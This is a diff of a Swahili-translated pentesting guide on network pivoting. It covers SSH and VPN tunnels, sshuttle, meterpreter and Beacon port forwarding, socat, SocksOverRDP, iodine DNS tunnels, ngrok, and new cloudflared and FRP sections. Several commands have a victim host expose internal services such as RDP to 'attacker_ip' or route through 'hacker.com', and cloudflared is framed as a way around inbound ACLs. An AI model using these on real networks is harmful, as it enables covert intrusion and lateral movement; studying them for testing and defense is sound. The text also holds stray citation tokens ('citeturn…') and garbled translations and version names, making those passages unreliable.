@@ -2,7 +2,7 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Nmap nasaha
 
 > [!WARNING]
 > **ICMP** na **SYN** skani haziwezekani kupitishwa kupitia socks proxies, hivyo tunapaswa **kuondoa kugundua ping** (`-Pn`) na kubainisha **TCP skani** (`-sT`) ili hii ifanye kazi.
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Unahitaji **root katika vifaa vyote viwili** (kama unavyotaka kuunda interfaces mpya) na usanidi wa sshd lazima uruhusu kuingia kwa root:\
+Unahitaji **root katika vifaa vyote viwili** (kama unavyotaka kuunda interfaces mpya) na usanidi wa sshd lazima uruhusu kuingia kama root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -87,15 +87,19 @@ Weka njia mpya upande wa mteja
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Usalama – Shambulio la Terrapin (CVE-2023-48795)**
+> Shambulio la kupunguza la Terrapin la mwaka 2023 linaweza kumruhusu mtu katikati kuingilia kati katika handshake ya awali ya SSH na kuingiza data katika **kila channel iliyosambazwa** ( `-L`, `-R`, `-D` ). Hakikisha mteja na seva zote zimepatishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au wazi wazi zima algorithimu hatarishi `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels. citeturn4search0
+
 ## SSHUTTLE
 
-Unaweza **tunnel** kupitia **ssh** kila **traffic** kwenda **subnetwork** kupitia mwenyeji.\
-Kwa mfano, kupeleka kila traffic inayokwenda 10.10.10.0/24
+Unaweza **kufanya tunneling** kupitia **ssh** kwa ajili ya **trafiki** yote kwenda **subnetwork** kupitia mwenyeji.\
+Kwa mfano, kusambaza trafiki yote inayokwenda 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Connect na ufunguo wa kibinafsi
+Unganisha kwa kutumia ufunguo wa kibinafsi
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -104,7 +108,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Local port --> Compromised host (active session) --> Third_box:Port
+Porti za ndani --> Kituo kilichovunjwa (sehemu inayofanya kazi) --> Sanduku_tatu:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -150,11 +154,11 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-To note:
+Kumbuka:
 
 - Reverse port forward ya Beacon imeundwa ili **kufanya tunnel trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
 - Trafiki **inafanywa tunnel ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
-- **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
+- **Haki za admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
 
 ### rPort2Port local
 
@@ -219,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Kuweka na Kusikiliza kwa Wakala
+### Ufunguo wa Wakala na Kusikiliza
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -290,8 +294,6 @@ Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya w
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-
 ### SSL Socat Tunnel
 
 **/bin/sh console**
@@ -343,10 +345,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Unahitaji kuwa na **RDP access juu ya mfumo**.\
+Unahitaji kuwa na **ufikiaji wa RDP juu ya mfumo**.\
 Pakua:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **kufanya tunneling kwa pakiti juu ya RDP connection**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Huduma ya Desktop ya K remote ya Windows. DVC inawajibika kwa **kuchora pakiti juu ya muunganisho wa RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
@@ -354,7 +356,7 @@ Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavy
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Sasa tunaweza **kuunganisha** na **mhasiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kipeperushi** kinachosema kwamba **SocksOverRDP plugin imewezeshwa**, na itakuwa **inaskiliza** kwenye **127.0.0.1:1080**.
+Sasa tunaweza **kuunganisha** na **mhasiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kiashiria** kinachosema kwamba **SocksOverRDP plugin imewezeshwa**, na itakuwa **inaskiliza** kwenye **127.0.0.1:1080**.
 
 **Unganisha** kupitia **RDP** na pakia & tekeleza kwenye mashine ya mhasiriwa `SocksOverRDP-Server.exe` binary:
 ```
@@ -383,7 +385,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Inathibitisha dhidi ya proxy na kuunganisha bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
+Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
 Kwa mfano, hiyo inapeleka bandari 443
 ```
 Username Alice
@@ -393,7 +395,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza katika bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
-Pia unaweza kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza katika bandari 2222.
+Unaweza pia kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza katika bandari 2222.
 
 ## YARP
 
@@ -405,7 +407,7 @@ Kipindi cha kurudi kilichoundwa na Microsoft. Unaweza kukipata hapa: [https://gi
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root inahitajika katika mifumo yote ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
+Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -506,7 +508,7 @@ _Ipo pia uwezekano wa kuongeza uthibitisho na TLS, ikiwa ni lazima._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Kuonyesha faili kwa kutumia HTTP
+#### Kuweka wazi faili kwa HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -528,7 +530,7 @@ Moja kwa moja kutoka stdout au katika kiolesura cha HTTP [http://127.0.0.1:4040]
 Inafungua mabwawa 3:
 
 - 2 TCP
-- 1 HTTP yenye uwasilishaji wa faili za kudumu kutoka /tmp/httpbin/
+- 1 HTTP na uonyeshaji wa faili za kudumu kutoka /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -541,6 +543,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+Cloudflare’s `cloudflared` daemon inaweza kuunda tunnels za nje zinazofichua **huduma za ndani za TCP/UDP** bila kuhitaji sheria za moto za kuingia, ikitumia ukingo wa Cloudflare kama mahali pa kukutana. Hii ni rahisi sana wakati firewall ya kutoka inaruhusu tu trafiki ya HTTPS lakini muunganisho wa kuingia umezuiwa.
+
+### Quick tunnel one-liner
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 pivot
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### Tunnels za kudumu na DNS
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Anza kiunganishi:
+```bash
+cloudflared tunnel run mytunnel
+```
+Kwa sababu trafiki yote inatoka kwenye mwenyeji **nje kupitia 443**, Cloudflared tunnels ni njia rahisi ya kupita ACLs za kuingia au mipaka ya NAT. Kuwa makini kwamba binary kawaida inafanya kazi na mamlaka ya juu – tumia kontena au lippu `--user` inapowezekana. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) ni proxy ya nyuma ya Go inayoshughulikiwa kwa ufanisi ambayo inasaidia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia na **v0.53.0 (Mei 2024)** inaweza kutenda kama **SSH Tunnel Gateway**, hivyo mwenyeji wa lengo anaweza kuanzisha tunnel ya nyuma kwa kutumia tu mteja wa kawaida wa OpenSSH – hakuna binary ya ziada inahitajika.
+
+### Classic reverse TCP tunnel
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Kutumia lango jipya la SSH (hakuna frpc binary)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+Amri iliyo hapo juu inachapisha bandari ya mwathirika **8080** kama **attacker_ip:9000** bila kupeleka zana zozote za ziada – bora kwa pivoting ya kuishi kwenye ardhi. citeturn2search1
+
 ## Zana nyingine za kuangalia
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
